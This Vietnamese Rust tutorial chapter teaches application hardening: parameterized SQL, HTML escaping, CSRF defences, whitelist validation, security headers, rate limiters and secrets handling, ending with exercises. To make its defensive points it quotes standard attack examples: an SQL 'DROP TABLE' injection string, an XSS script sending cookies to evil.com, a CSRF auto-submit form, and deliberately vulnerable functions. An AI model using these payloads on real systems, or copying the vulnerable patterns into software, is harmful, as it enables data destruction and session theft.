# Chapter 41 — Application Security & Hardening

> **Bạn sẽ học được**:
> - **OWASP Top 10**: SQL Injection, XSS, CSRF, SSRF
> - **Input validation**: whitelist > blacklist
> - **HTTPS/TLS**: certificates, HSTS
> - **Security headers**: CSP, X-Frame-Options
> - **Rate limiting**: sliding window, token bucket
> - **Secrets management**: env vars, Vault
>
> **Yêu cầu trước**: Chapter 40 (Security Essentials).
> **Thời gian đọc**: ~40 phút | **Level**: Principal
> **Kết quả cuối cùng**: Bạn biết cách **phòng thủ** cho web application — không chỉ "nó hoạt động" mà "nó an toàn".

---

## Application Security & Hardening — Bảo vệ ứng dụng

Security không phải feature bạn "thêm vào cuối" — đó là mindset xuyên suốt quá trình phát triển. OWASP Top 10 liệt kê 10 lỗ hổng phổ biến nhất: SQL injection, XSS, CSRF... Hầu hết có thể ngăn chặn bằng practices đơn giản mà nhiều developers bỏ qua.

Rust giúp ở mức thấp (memory safety), nhưng application-level security vẫn cần bạn chủ động: validate inputs, escape outputs, manage secrets, enforce HTTPS. Chapter này dạy bạn cách.

---

Ch40 dạy security fundamentals (auth, encryption). Chapter này dạy **application-level hardening** — bảo vệ ứng dụng khỏi OWASP Top 10 vulnerabilities.

Tại sao cần chapter riêng? Vì security fundamentals (hashing, JWT) chỉ là **building blocks**. Application security là cách bạn **kết hợp** chúng: input validation ở mọi boundary, output escaping dưa vào context (HTML vs SQL vs JavaScript), CSP headers ngăn XSS, CSRF tokens bảo vệ form submissions, rate limiting ngăn brute-force.

Rust giúp ở mức thấp: memory safety = không có buffer overflow, type safety = không có type confusion. Nhưng application-level attacks (SQL injection, XSS, SSRF) vẫn có thể xảy ra nếu bạn không validate inputs. Zod-equivalent validation (từ Ch14 Newtype + Ch24 ROP) là **defense in depth** hiệu quả nhất.

Đây là chapter mà nếu bạn skip, ứng dụng production của bạn **sẽ** bị hack. Không phải "có thể" — mà là "chắc chắn".

## 41.1 — OWASP Top 10 (Critical Vulnerabilities)

### 1. SQL Injection

```rust
// filename: src/main.rs

// ❌ VULNERABLE: String interpolation → SQL injection
fn find_user_bad(email: &str) -> String {
    // Input: email = "'; DROP TABLE users; --"
    format!("SELECT * FROM users WHERE email = '{}'", email)
    // → "SELECT * FROM users WHERE email = ''; DROP TABLE users; --'"
    // → TABLE DROPPED! 💀
}

// ✅ SAFE: Parameterized query
fn find_user_good(email: &str) -> String {
    // sqlx: query!("SELECT * FROM users WHERE email = $1", email)
    // Tham số KHÔNG BAO GIỜ được interpreted as SQL
    format!("SELECT * FROM users WHERE email = $1 -- bind: {}", email)
}

fn main() {
    let attack = "'; DROP TABLE users; --";

    println!("BAD: {}", find_user_bad(attack));
    println!("GOOD: {}", find_user_good(attack));
}
```

> **Rule**: **NEVER** concatenate user input into SQL. ALWAYS use parameterized queries (`$1`, `$2`).

### 2. XSS (Cross-Site Scripting)

```rust
// filename: src/main.rs

// ❌ VULNERABLE: Raw user input in HTML
fn render_comment_bad(user_input: &str) -> String {
    // Input: "<script>document.location='evil.com?c='+document.cookie</script>"
    format!("<div class='comment'>{}</div>", user_input)
    // → Script runs in every visitor's browser → steals cookies!
}

// ✅ SAFE: HTML escape
fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
     .replace('<', "&lt;")
     .replace('>', "&gt;")
     .replace('"', "&quot;")
     .replace('\'', "&#x27;")
}

fn render_comment_good(user_input: &str) -> String {
    format!("<div class='comment'>{}</div>", html_escape(user_input))
}

fn main() {
    let attack = "<script>alert('XSS')</script>";

    println!("BAD:\n  {}", render_comment_bad(attack));
    println!("GOOD:\n  {}", render_comment_good(attack));
    // → <div class='comment'>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
}
```

### 3. CSRF (Cross-Site Request Forgery)

```
Evil site has:
  <form action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000000">
  </form>
  <script>document.forms[0].submit();</script>

User visits evil site → form auto-submits →
bank thinks it's user (has session cookie) → money transferred!

Defence:
  1. CSRF Token (random, per-session, validated server-side)
  2. SameSite=Strict cookie attribute
  3. Check Origin/Referer headers
```

### Bảng tham chiếu nhanh OWASP Top 10

| # | Lỗ hổng | Phòng thủ |
|---|--------------|---------|
| 1 | **Injection** (SQL, Command) | Query có tham số, dùng ORM |
| 2 | **Xác thực yếu** | Mật khẩu mạnh, MFA, rate limit login |
| 3 | **Lộ dữ liệu nhạy cảm** | Mã hóa lưu trữ + truyền, không log secrets |
| 4 | **XSS** | Escape HTML, CSP header, làm sạch input |
| 5 | **CSRF** | CSRF tokens, SameSite cookies |
| 6 | **Cấu hình sai** | Tắt defaults, không debug trong production |
| 7 | **Deserialization không an toàn** | Validate + kiểm tra kiểu dữ liệu |
| 8 | **Dependencies có lỗ hổng** | `cargo audit`, cập nhật thường xuyên |
| 9 | **Thiếu Logging** | Log sự kiện auth, giám sát bất thường |
| 10 | **SSRF** | Whitelist URLs, chặn IP nội bộ |

---

## 41.2 — Input Validation

### Whitelist > Blacklist

```rust
// filename: src/main.rs

// ❌ Blacklist: block known bad chars (always incomplete!)
fn validate_blacklist(input: &str) -> bool {
    !input.contains('<') && !input.contains('>') && !input.contains('\'')
    // Attacker finds: %3C (URL encoded <) → bypassed!
}

// ✅ Whitelist: only allow known good
fn validate_username(input: &str) -> Result<String, String> {
    let trimmed = input.trim();
    if trimmed.len() < 3 || trimmed.len() > 30 {
        return Err("Username: 3-30 characters".into());
    }
    if !trimmed.chars().all(|c| c.is_alphanumeric() || c == '_') {
        return Err("Username: letters, digits, underscore only".into());
    }
    Ok(trimmed.to_string())
}

fn validate_phone(input: &str) -> Result<String, String> {
    let digits: String = input.chars().filter(|c| c.is_ascii_digit()).collect();
    if digits.len() < 10 || digits.len() > 11 {
        return Err("Phone: 10-11 digits".into());
    }
    Ok(digits)
}

fn validate_url(input: &str) -> Result<String, String> {
    if !input.starts_with("https://") {
        return Err("URL must use HTTPS".into());
    }
    // Whitelist allowed domains
    let allowed = ["api.example.com", "cdn.example.com"];
    let host = input.trim_start_matches("https://").split('/').next().unwrap_or("");
    if !allowed.contains(&host) {
        return Err(format!("Domain not allowed: {}", host));
    }
    Ok(input.to_string())
}

fn main() {
    println!("{:?}", validate_username("minh_nguyen"));
    println!("{:?}", validate_username("<script>"));
    println!("{:?}", validate_phone("0912-345-678"));
    println!("{:?}", validate_url("https://api.example.com/data"));
    println!("{:?}", validate_url("https://evil.com/steal"));
}
```

### Validation pipeline (reusable)

```rust
// filename: src/main.rs

type Validator<T> = Box<dyn Fn(&T) -> Result<(), String>>;

struct ValidationPipeline<T> {
    validators: Vec<(String, Validator<T>)>,
}

impl<T> ValidationPipeline<T> {
    fn new() -> Self { ValidationPipeline { validators: vec![] } }

    fn add(mut self, name: &str, validator: impl Fn(&T) -> Result<(), String> + 'static) -> Self {
        self.validators.push((name.into(), Box::new(validator)));
        self
    }

    fn validate(&self, value: &T) -> Result<(), Vec<String>> {
        let errors: Vec<String> = self.validators.iter()
            .filter_map(|(name, v)| v(value).err().map(|e| format!("{}: {}", name, e)))
            .collect();
        if errors.is_empty() { Ok(()) } else { Err(errors) }
    }
}

fn main() {
    let email_validator = ValidationPipeline::<String>::new()
        .add("not_empty", |s| if s.is_empty() { Err("Required".into()) } else { Ok(()) })
        .add("has_at", |s| if s.contains('@') { Ok(()) } else { Err("Must contain @".into()) })
        .add("min_length", |s| if s.len() >= 5 { Ok(()) } else { Err("Min 5 chars".into()) })
        .add("no_spaces", |s| if s.contains(' ') { Err("No spaces".into()) } else { Ok(()) });

    println!("{:?}", email_validator.validate(&"minh@co.com".into()));
    println!("{:?}", email_validator.validate(&"bad".into()));
    println!("{:?}", email_validator.validate(&"".into()));
}
```

---

## 41.3 — HTTPS, TLS & Security Headers

### HTTPS = HTTP + TLS

```
HTTP:   Client ←──── plaintext ────→ Server
        Attacker can READ and MODIFY traffic!

HTTPS:  Client ←──── encrypted ────→ Server
        Attacker sees garbage bytes.
```

### Security Headers

```rust
// filename: src/main.rs

use std::collections::HashMap;

fn security_headers() -> HashMap<&'static str, &'static str> {
    let mut headers = HashMap::new();

    // Prevent XSS
    headers.insert("Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");

    // Prevent clickjacking (iframe embedding)
    headers.insert("X-Frame-Options", "DENY");

    // Force HTTPS for 1 year
    headers.insert("Strict-Transport-Security",
        "max-age=31536000; includeSubDomains");

    // Prevent MIME sniffing
    headers.insert("X-Content-Type-Options", "nosniff");

    // Control referrer info
    headers.insert("Referrer-Policy", "strict-origin-when-cross-origin");

    // Disable browser features
    headers.insert("Permissions-Policy",
        "camera=(), microphone=(), geolocation=()");

    headers
}

fn main() {
    println!("Security Headers:");
    for (name, value) in security_headers() {
        println!("  {}: {}", name, value);
    }
}
```

| Header | Ngăn chặn | Giá trị |
|--------|----------|-------|
| `Content-Security-Policy` | XSS, injection | `default-src 'self'` |
| `X-Frame-Options` | Clickjacking | `DENY` |
| `Strict-Transport-Security` | Hạ cấp HTTP | `max-age=31536000` |
| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
| `Referrer-Policy` | Lộ thông tin | `strict-origin-when-cross-origin` |

---

## 41.4 — Rate Limiting

### Sliding Window

```rust
// filename: src/main.rs

use std::collections::HashMap;
use std::time::{Duration, Instant};

struct RateLimiter {
    requests: HashMap<String, Vec<Instant>>,
    max_requests: usize,
    window: Duration,
}

impl RateLimiter {
    fn new(max_requests: usize, window_secs: u64) -> Self {
        RateLimiter {
            requests: HashMap::new(),
            max_requests,
            window: Duration::from_secs(window_secs),
        }
    }

    fn allow(&mut self, client_id: &str) -> Result<(), String> {
        let now = Instant::now();
        let window_start = now - self.window;

        let timestamps = self.requests.entry(client_id.into()).or_default();

        // Remove expired entries
        timestamps.retain(|t| *t > window_start);

        if timestamps.len() >= self.max_requests {
            Err(format!("Rate limit exceeded: {} requests / {}s",
                self.max_requests, self.window.as_secs()))
        } else {
            timestamps.push(now);
            Ok(())
        }
    }

    fn remaining(&self, client_id: &str) -> usize {
        let count = self.requests.get(client_id)
            .map(|ts| {
                let window_start = Instant::now() - self.window;
                ts.iter().filter(|t| **t > window_start).count()
            })
            .unwrap_or(0);
        self.max_requests.saturating_sub(count)
    }
}

fn main() {
    let mut limiter = RateLimiter::new(5, 60); // 5 requests per minute

    for i in 1..=7 {
        match limiter.allow("user-123") {
            Ok(()) => println!("Request {}: ✅ (remaining: {})", i, limiter.remaining("user-123")),
            Err(e) => println!("Request {}: ❌ {}", i, e),
        }
    }
}
```

### Token Bucket (alternative)

```rust
// filename: src/main.rs

use std::time::Instant;

struct TokenBucket {
    capacity: f64,
    tokens: f64,
    refill_rate: f64, // tokens per second
    last_refill: Instant,
}

impl TokenBucket {
    fn new(capacity: f64, refill_rate: f64) -> Self {
        TokenBucket { capacity, tokens: capacity, refill_rate, last_refill: Instant::now() }
    }

    fn allow(&mut self) -> bool {
        self.refill();
        if self.tokens >= 1.0 {
            self.tokens -= 1.0;
            true
        } else {
            false
        }
    }

    fn refill(&mut self) {
        let now = Instant::now();
        let elapsed = now.duration_since(self.last_refill).as_secs_f64();
        self.tokens = (self.tokens + elapsed * self.refill_rate).min(self.capacity);
        self.last_refill = now;
    }
}

fn main() {
    let mut bucket = TokenBucket::new(10.0, 2.0); // 10 burst, 2/sec refill

    for i in 1..=15 {
        if bucket.allow() {
            println!("Request {}: ✅ (tokens: {:.1})", i, bucket.tokens);
        } else {
            println!("Request {}: ❌ rate limited", i);
        }
    }
}
```

---

## 41.5 — Secrets Management

```
❌ BAD:
  const DB_PASSWORD: &str = "mysecretpassword";  // in source code!
  const API_KEY: &str = "sk-abc123...";           // committed to git!

✅ GOOD:
  Development:  .env file (git-ignored)
  Production:   env vars, Vault, AWS SSM, GCP Secret Manager
```

```rust
// filename: src/main.rs

use std::env;

struct Config {
    database_url: String,
    jwt_secret: String,
    smtp_password: String,
}

impl Config {
    fn from_env() -> Result<Self, String> {
        Ok(Config {
            database_url: env::var("DATABASE_URL")
                .map_err(|_| "DATABASE_URL not set")?,
            jwt_secret: env::var("JWT_SECRET")
                .map_err(|_| "JWT_SECRET not set")?,
            smtp_password: env::var("SMTP_PASSWORD")
                .map_err(|_| "SMTP_PASSWORD not set")?,
        })
    }
}

fn main() {
    // In production: env vars set by deployment system
    // In dev: use .env file (crate: dotenvy)

    match Config::from_env() {
        Ok(config) => println!("Config loaded (DB: {}...)", &config.database_url[..20.min(config.database_url.len())]),
        Err(e) => println!("Missing config: {}", e),
    }

    println!("\nSecrets rules:");
    println!("  1. NEVER hardcode secrets in source");
    println!("  2. NEVER commit .env to git");
    println!("  3. Use env vars or secret manager in production");
    println!("  4. Rotate secrets regularly");
    println!("  5. Different secrets per environment");
}
```

---

## 🏋️ Bài tập

**Bài 1** (5 phút): Tìm lỗ hổng bảo mật

```rust
fn login(email: &str, password: &str) -> String {
    let query = format!("SELECT * FROM users WHERE email='{}' AND password='{}'", email, password);
    // execute query...
    format!("Welcome! {}", email)
}
```
Liệt kê TẤT CẢ security issues.

<details><summary>✅ Lời giải</summary>

1. **SQL Injection** — nối chuỗi, không dùng tham số
2. **Mật khẩu plaintext** — so sánh trực tiếp, không hash
3. **XSS** — trả email vào response không escape
4. **Timing attack** — cùng thời gian phản hồi dù có/không tìm thấy user
5. **Không rate limiting** — có thể brute-force

</details>

---

**Bài 2** (10 phút): Xây dựng bộ làm sạch input (Input sanitizer)

Xây dựng `Sanitizer` struct với các method chuỗi:
- `trim()` — remove whitespace
- `max_length(n)` — truncate
- `strip_html()` — remove HTML tags
- `lowercase()` — to lowercase

<details><summary>✅ Lời giải Bài 2</summary>

```rust
struct Sanitizer { value: String }

impl Sanitizer {
    fn new(input: &str) -> Self { Sanitizer { value: input.into() } }
    fn trim(mut self) -> Self { self.value = self.value.trim().into(); self }
    fn max_length(mut self, n: usize) -> Self {
        if self.value.len() > n { self.value = self.value[..n].into(); }
        self
    }
    fn strip_html(mut self) -> Self {
        let mut result = String::new();
        let mut in_tag = false;
        for c in self.value.chars() {
            match c {
                '<' => in_tag = true,
                '>' => in_tag = false,
                _ if !in_tag => result.push(c),
                _ => {}
            }
        }
        self.value = result;
        self
    }
    fn lowercase(mut self) -> Self { self.value = self.value.to_lowercase(); self }
    fn build(self) -> String { self.value }
}

// Usage:
let clean = Sanitizer::new("  <b>Hello</b> WORLD  ")
    .trim().strip_html().lowercase().max_length(20).build();
assert_eq!(clean, "hello world");
```

</details>

---

## 🔧 Troubleshooting

| Vấn đề | Nguyên nhân | Giải pháp |
|---------|-------------|-----------|
| "Vẫn bị XSS" | Input đã escape nhưng output không | Escape lúc render, không phải lúc nhập |
| "CORS bị chặn" | Thiếu headers | `Access-Control-Allow-Origin: domain` (không `*` trong prod) |
| "Bypass rate limiter" | Rate limit theo IP, hạcker dùng proxy | Kết hợp IP + user ID + fingerprint |
| "Secrets trong logs" | Log request bodies | Lọc các trường nhạy cảm trước khi log |

---

## Tóm tắt

- ✅ **OWASP Top 10**: SQL Injection (parameterize!), XSS (escape!), CSRF (tokens!).
- ✅ **Input validation**: Whitelist > blacklist. Validate ALL input, escape ALL output.
- ✅ **Security headers**: CSP, HSTS, X-Frame-Options — defense in depth.
- ✅ **Rate limiting**: Sliding window (simple) or Token bucket (burst-friendly).
- ✅ **Secrets**: Env vars (dev: `.env`, prod: Vault/SSM). NEVER in source code.

## Tiếp theo

→ Chapter 42: **Distributed Systems Fundamentals** — CAP theorem, consensus, message queues, Saga, Circuit Breaker, observability.
